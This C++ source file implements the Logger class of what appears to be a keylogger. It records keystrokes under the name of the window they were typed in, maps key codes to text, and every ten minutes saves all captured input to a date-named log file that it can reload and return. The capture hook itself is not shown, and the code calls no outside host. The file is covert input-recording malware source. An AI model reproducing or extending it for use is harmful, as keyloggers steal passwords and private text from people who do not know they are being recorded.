#include "pch.h"
#include "Logger.h"

// Logger(string) : Constructor of the Logger class
Logger::Logger()
{
	this->SetActive(true);
	this->SetDate(Utilities::GetCurrentDate());
}

// Insert(string, string) : Insert into map the key stroke on the window
void Logger::Insert(string window_name, string key_input)
{
	this->Log[window_name] += key_input;
	cout << window_name << " : " << this->Log[window_name] << endl; // DEBUG
}

// Insert(string, int) : Insert into map the key stroke on the window
void Logger::Insert(string window_name, int key_input)
{
	this->Log[window_name] += key_input;
	cout << window_name << " : " << this->Log[window_name] << endl; // DEBUG
}


// Add(string, int) : Add key stroke and the window name to Logger
void Logger::Add(string window_name, int key_stroke)
{
	// Make sure log is up to date befre adding anything
	this->Update();

	// Check if key stroke is mapped if not map_key == "" 
	string map_key = Keys.Map[key_stroke];

	// If key is not mapped
	if (map_key == "")
	{
		if(key_stroke == 190 || key_stroke == 110)
		{
			this->Insert(window_name, "."); // Not working
		}
		else
		{
			this->Insert(window_name, key_stroke);
		}
	}
	else
	{		
		this->Insert(window_name, map_key);
	}
}

// Update() : Update the log date and save and clean log when date change
void Logger::Update()
{
	//
	if (this->Timer.getElapsedTime() >= seconds(60*10))
	{
		// Save log to file with the old date as file name
		this->SaveToFile();

		// If current date is different than log date
		if (this->GetDate() != Utilities::GetCurrentDate())
		{
			// Clear map log
			this->Log.clear();

			// Update the log date
			this->SetDate(Utilities::GetCurrentDate());
		}
	}
}

// SaveToFile() : Save Map content to file
void Logger::SaveToFile()
{
	// Initiate file stream and map iterator
	ofstream file(this->Date + ".log");
	map<string, string>::iterator iter;

	// Go through all map log and write it to file
	for (iter = Log.begin(); iter != Log.end(); ++iter)
	{
		file << iter->first << endl;
		file << iter->second << endl;
	}

	// Close file
	file.close();
}

// LoadFromFile() : Load file content to map
bool Logger::LoadFromFile()
{
	ifstream file(this->Date + ".log");

	// Make sure file exist
	if (!file)
		return false; // Unable to open file
	else
	{
		string window_line;
		string log_line;

		// Getline while not at end of file
		while (getline(file, window_line)) // Even line = window name
		{
			getline(file, log_line); // Odd line = log entre of previous even line (window name)
			this->Log[window_line] = log_line; // Add file entrees to map log
		}

		file.close();
		return true;
	}
}

// GetLog(string) : Return the key log for a specific window
string Logger::GetLog(string window_name) 
{
	return this->Log.find(window_name)->second;
}

// GetLog(string) : Return all the key log for all window
string Logger::GetLog()
{
	string log = "";

	// Go through all the log
	for (map<string, string>::iterator iter = Log.begin(); iter != Log.end(); ++iter)
	{
		log += iter->first + " > " + iter->second;
	}

	return log;
}

// GetPath() : Return the path to the log file
string Logger::GetDate() const
{
	return this->Date;
}

// SetPath(string) :  Set the path of the log file
void Logger::SetDate(string date)
{
	this->Date = date;
}

// GetActive() : Return the log status attribut
bool Logger::GetActive() const
{
	return this->Active;
}

// SetActive(bool) : Set the status attribut of log
void Logger::SetActive(bool status)
{
	this->Active = status;
}